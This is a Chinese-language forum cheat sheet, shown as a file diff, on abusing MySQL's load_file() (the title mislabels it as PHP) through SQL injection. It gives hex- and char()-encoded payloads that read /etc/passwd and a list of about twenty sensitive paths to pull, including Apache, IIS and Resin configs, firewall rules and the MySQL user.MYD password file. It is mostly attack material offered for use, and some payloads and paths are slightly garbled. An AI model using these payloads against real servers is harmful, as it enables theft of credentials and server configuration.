@@ -1,0 +1,52 @@
+PHP中的load_file()函数淫荡用法
+
+
+1、 replace(load_file(0×2F6574632F706173737764),0×3c,0×20)
+
+2、 replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))
+上面两个是查看一个PHP文件里完全显示代码.有些时候不替换一些字符,如 “<” 替换成”空格” 返回的是网页.而无法查看到代码.
+
+3、 load_file(char(47)) 可以列出FreeBSD,Sunos系统根目录
+
+4、/etc /httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf 查看linux APACHE虚拟主机配置文件
+
+5、 c:\Program Files\Apache Group\Apache\conf \httpd.conf 或C:\apache\conf \httpd.conf    查看WINDOWS系统apache文件
+
+6、c:/Resin- 3.0.14/conf/resin.conf 查看jsp开发的网站 resin文件配置信息.
+
+7、c:/Resin /conf/resin.conf     /usr/local/resin/conf/resin.conf 查看linux系统配置的JSP虚拟主机
+
+8、d:\APACHE \Apache2\conf\httpd.conf  
+
+9、 C:\Program Files\mysql\my.ini
+
+10、../themes /darkblue_orange/layout.inc.php    phpmyadmin 爆路径  
+
+11、    c:\windows\system32\inetsrv\MetaBase.xml 查看IIS的虚拟主机配置文件
+
+12、 /usr/local/resin-3.0.22/conf/resin.conf    针对3.0.22的RESIN配置文件查看
+
+13、 /usr/local/resin-pro-3.0.22/conf/resin.conf 同上
+
+14 、/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看
+
+15、 /etc/sysconfig/iptables 本看防火墙策略
+
+16 、 usr/local/app/php5/lib/php.ini    PHP 的相当设置
+
+17 、/etc/my.cnf    MYSQL的配置文件
+
+18、 /etc/redhat-release 红帽子的系统版本
+
+19 、C:\mysql\data\mysql\user.MYD 存在MYSQL系统中的用户密码
+
+20、/etc /sysconfig/network-scripts/ifcfg-eth0 查看IP.
+
+21、/usr /local/app/php5/lib/php.ini //PHP相关设置
+
+22、/usr /local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置
+
+23、 c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini
+
+24、 c:\windows\my.ini
+本文来自: 红科网安官方网络安全论坛 http://bbs.honkwin.com
